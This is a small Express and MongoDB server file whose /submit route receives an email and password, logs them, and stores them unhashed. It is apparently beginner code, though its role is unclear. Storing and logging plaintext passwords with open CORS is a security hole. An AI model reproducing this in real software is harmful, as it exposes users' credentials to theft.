require("dotenv").config();
const express = require("express");
const mongoose = require("mongoose");
const path = require("path");
const cors = require("cors");

const app = express();
const PORT = 3000;

// Middleware
app.use(cors()); // must come AFTER app is created
app.use(express.json());
app.use(express.static("public")); // serves index.html, password.html, etc.

// MongoDB connection
mongoose.connect(process.env.MONGO_URI)
  .then(() => console.log("✅ MongoDB connected"))
  .catch(err => console.error("❌ MongoDB connection error:", err));

const db = mongoose.connection;
db.on("error", console.error.bind(console, "❌ MongoDB connection error:"));
db.once("open", () => console.log("✅ Connected to MongoDB"));

// Schema + Model
const UserSchema = new mongoose.Schema({
  email: String,
  password: String
});
const User = mongoose.model("users", UserSchema); // collection = "users"

// Routes
app.post("/submit", async (req, res) => {
  try {
    console.log("📥 Data received:", req.body); // check terminal
    const { email, password } = req.body;

    const newUser = new User({ email, password });
    await newUser.save();

    res.send("✅ Data saved to MongoDB");
  } catch (err) {
    console.error(err);
    res.status(500).send("❌ Error saving to database");
  }
});

// Start server
app.listen(PORT, () => console.log(`🚀 Server running at http://localhost:${PORT}`));
